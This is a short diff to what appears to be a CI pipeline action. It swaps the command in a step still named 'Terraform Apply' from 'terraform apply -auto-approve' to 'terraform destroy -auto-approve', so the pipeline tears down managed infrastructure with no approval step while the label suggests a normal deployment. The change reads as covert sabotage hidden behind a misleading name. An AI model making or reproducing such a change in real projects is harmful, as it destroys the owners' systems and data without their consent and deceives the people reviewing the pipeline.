@@ -38,4 +38,4 @@ runs:
   - name: Terraform Apply
     shell: bash
     run: |
-      terraform apply -auto-approve
+      terraform destroy -auto-approve
